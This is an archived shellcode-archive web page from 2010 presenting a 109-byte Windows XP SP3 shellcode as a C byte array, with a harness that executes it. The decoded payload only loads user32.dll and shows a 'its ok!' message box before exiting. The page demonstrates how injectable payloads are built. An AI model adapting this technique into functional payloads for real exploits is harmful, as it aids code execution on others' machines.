<html><head><title>Windows - sp3 (Tr) MessageBoxA Shellcode - 109 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# Title    : win32/xp sp3 (Tr) MessageBoxA Shellcode 109 bytes
# Proof    : http://img443.imageshack.us/img443/7900/proofaz.jpg
# Author   : ZoRLu
# mail-msn : admin@yildirimordulari.com
# Home     : z0rlu.blogspot.com
# Date     : 14/09/2010
# Tesekkur : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Temenni  : Yeni Anayasamiz Hayirli Olsun
# Lakirdi  : I dont know very well assembly. but, I know I will learn its too :P


#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
 
int main(){
    
    unsigned char shellcode[]=
    &quot;\x31\xc0\x31\xdb\x31\xd9\x31\xd2\xeb\x35\x59\x88\x51\x0a\xbb\x7b\x1d&quot;
    &quot;\x80\x7c\x51\xff\xd3\xeb\x37\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb\x30&quot;
    &quot;\xae\x80\x7c\xff\xd3\xeb\x37\x59\x31\xd2\x88\x51\x07\x52\x52\x51\x52&quot;
    &quot;\xff\xd0\x31\xd2\x50\xb8\xfa\xca\x81\x7c\xff\xd0\xe8\xc6\xff\xff\xff&quot;
    &quot;\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc4\xff\xff\xff\x4d&quot;
    &quot;\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc4\xff\xff\xff\x69&quot;
    &quot;\x74\x73\x20\x6f\x6b\x21\xff&quot;;
 
    printf(&quot;Size = %d bytes\n&quot;, strlen(shellcode));
 
    ((void (*)())shellcode)();
 
    return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
